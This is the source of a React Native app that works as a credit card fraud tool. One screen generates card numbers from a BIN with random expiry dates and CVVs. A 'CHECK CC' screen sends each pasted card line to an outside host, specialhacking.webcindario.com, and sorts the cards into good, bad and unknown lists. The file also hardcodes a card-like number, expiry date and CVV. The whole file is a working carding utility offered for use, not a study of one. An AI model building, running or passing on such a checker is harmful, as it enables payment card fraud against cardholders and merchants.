import { StatusBar } from 'expo-status-bar';
import React, {useState} from 'react';
import { StyleSheet, Text, View, TextInput, Button, ScrollView, Dimensions,KeyboardAvoidingView, TouchableOpacity } from 'react-native';

export default function App() {
  let screenWidth = Dimensions.get('window').width;
  const [value, setValue] = useState('')
  const [cc, setcc] = useState('')
  const [amount, setAmount] = useState('')
  const [kLINST, setKlIST] = useState('')
  const [page, setpage] = useState('')
  const [pagb, setpagb] = useState('')
  const [pagk, setpagk] = useState('')
  var good_cc = []
  var bad_cc = []
  var unk_cc = []



  function checkerf(){
    if (kLINST === '') {
      alert('Placeholder cannot be empty')
    }
    else {
      setpage('')
      setpagb('')
      setpagk('')
      good_cc = []
      bad_cc = []
      unk_cc = []
     // alert(good_cc, bad_cc, unk_cc)
      var k;
     // alert(kLINST.split('\n',).length)
      for (let voarr of kLINST.split('\n',)) {
      var number = '5333171099289383|01|2024|334';
      var data = new FormData();
      data.append('data', voarr);
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://specialhacking.webcindario.com/api.php', true);
      xhr.onload = function () {
         // alert(voarr)
          var response_kk = this.responseText
          var res = response_kk.split("}")[0] + '}'; 
          var condition_state = JSON.parse(res).error;
          //alert(condition_state)
         // alert(condition_state)
  
          if (condition_state === 1) {
            //alert('asd')
            good_cc.push(voarr)
            setpage(good_cc.toString().replace(/,/g, '\n',))
          } else if (condition_state === 2) {
            bad_cc.push(voarr)
            setpagb(bad_cc.toString().replace(/,/g, '\n',))
  
          } else if (condition_state === 3) {
            unk_cc.push(voarr)
            setpagk(unk_cc.toString().replace(/,/g, '\n',))
  
          }
  
      };
      xhr.send(data);
      
  
    }
    }

  //alert('GOOD: ' + good_cc + '\n' + 'BAD: ' + bad_cc)

};
  function getRandom(length) {

    return Math.floor(Math.pow(10, length-1) + Math.random() * 9 * Math.pow(10, length-1));
    
    }
  function changevaluee() {
    var number;
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    const years = ['2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2020', '2021', '2022', '2023'];
    var flisf = [];
    var facchintosh = [];
    if (value === '') {
      alert('Placeholder cannot be empty')
    }
    else if (value.includes('x')) {
      for (number = 0; number < amount; number++) {
        flisf = [];
        for (let foof of value) {
          
          if (foof === 'x') {foof = getRandom(1); flisf.push(foof)}
          else {flisf.push(foof)}


        }
       // alert(flisf.toString().replace(/,/g, ''))
        facchintosh.push(flisf.toString().replace(/,/g, '') + getRandom(16 - value.length) + '|' + months[Math.floor(Math.random() * months.length)] + '|' + years[Math.floor(Math.random() * years.length)] + '|' + getRandom(3))
        setcc(facchintosh.toString().replace(/,/g, '\n',))
      }
    } 
    else {
      var ccs = []
      var i;
      var a;
      var xr = 16 - value.length
      const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
      const years = ['2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2020', '2021', '2022', '2023'];


      for (i = 0; i < amount; i++) {
        
        //alert('BIN: ' + value + "x".repeat(xr) + '\n' + 'CC: ' + value + getRandom(xr))
        ccs.push(value + getRandom(xr) + '|' + months[Math.floor(Math.random() * months.length)] + '|' + years[Math.floor(Math.random() * years.length)] + '|' + getRandom(3))
      }
      setcc(ccs.toString().replace(/,/g, '\n',) )
    }
  }
  return (

    <ScrollView style={{backgroundColor: '#202026'}} horizontal={true} pagingEnabled={true} showsHorizontalScrollIndicator={true} scrollIndicatorInsets={{top:0,left:10,bottom:2,right:10}}>





    
    
    <KeyboardAvoidingView style={{flex: 1,backgroundColor: '#202026',alignItems: 'center',justifyContent: 'center',marginTop: 20,width: screenWidth
  }}>
 
      <TextInput placeholderTextColor="#9b9b9f" placeholder='Insert BIN' onChangeText={text => setValue(text)} style={{borderBottomWidth: 2, borderBottomColor: '#548480', marginBottom: 25, width: 150, textAlign: 'center', color: "#9b9b9f"}}></TextInput>
      <TextInput keyboardType='numeric' placeholderTextColor="#9b9b9f" placeholder='CC Amount' onChangeText={text => setAmount(text)} style={{borderBottomWidth: 2, borderBottomColor: '#548480', marginBottom: 25, width: 150, textAlign: 'center', color: "#9b9b9f"}}></TextInput>
      <TextInput
        editable={false}
        value={cc}
        multiline={true}
        numberOfLines={10}
        placeholderTextColor="#9b9b9f"
        selectionColor="#9b9b9f"
        style={styles.textInput}
      />
      <TouchableOpacity
        style={{alignItems: "center",backgroundColor: "#9b9b9f",padding: 10}}
        onPress={() => changevaluee()}
      >
        <Text>GENERATE CC</Text>
      </TouchableOpacity>

</KeyboardAvoidingView>





<KeyboardAvoidingView style={{flex: 1,backgroundColor: '#202026',alignItems: 'center',justifyContent: 'center',marginTop: 20,width: screenWidth
  }}>
          <TextInput
      placeholder='53012724539xxxxx|05|2022|653'
      onChangeText={text => setKlIST(text)}
        editable={true}
        multiline={true}
        numberOfLines={10}
        placeholderTextColor="#9b9b9f"
        style={{borderColor: '#548480',
        paddingHorizontal: 12,
        width: 270,
        marginTop: 40,
        color: "#9b9b9f",
        borderStyle: 'solid',
        overflow: 'hidden',
       // marginTop: 5,
        borderWidth: 3,
        borderRadius: 25,
        height: 170,
        textAlign: 'center',
        justifyContent: 'flex-start',
        borderBottomWidth: 4,}}
      />

        <TextInput
        editable={false}
        value={page}
        placeholder='GOOD CC'
        multiline={true}
        numberOfLines={10}
        placeholderTextColor="#9b9b9f"
        style={[styles.outputspace, {borderColor: 'green'}]}
      />
        <TextInput
        editable={false}
        placeholder='BAD CC'
        placeholderTextColor="#9b9b9f"
        value={pagb}
        multiline={true}
        numberOfLines={10}
        placeholderTextColor="#9b9b9f"
        style={[styles.outputspace, {borderColor: 'red'}]}
      />
        <TextInput
        editable={false}
        placeholder='UNKNOWN CC'
        placeholderTextColor="#9b9b9f"
        value={pagk}
        multiline={true}
        numberOfLines={10}
        placeholderTextColor="#9b9b9f"
        style={[styles.outputspace, {borderColor: 'orange', marginBottom: 35}]}
      />
      <TouchableOpacity
        style={{alignItems: "center",backgroundColor: "#9b9b9f",padding: 10}}
        onPress={() => checkerf()}
      >
        <Text>CHECK CC</Text>
      </TouchableOpacity>
     
</KeyboardAvoidingView>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 20,
   // width: screenW
  },
  textInput:{
    
    color: "#9b9b9f",
    paddingHorizontal: 12,
    width: 260,
    height: 200,
    textAlign: 'left',
    justifyContent: 'flex-start',
    borderColor: '#548480',
    borderBottomWidth: 3,
    borderLeftWidth: 2,
    borderRightWidth: 2,
    borderTopWidth: 2,
    borderRadius: 30,
    marginTop: 50,
    marginBottom: 50

  },
  outputspace: {
    color: "#9b9b9f",
    paddingHorizontal: 12,
    width: 260,
    height: 85,
    textAlign: 'left',
    justifyContent: 'flex-start',
    borderLeftWidth: 2,
    marginTop: 30}
});
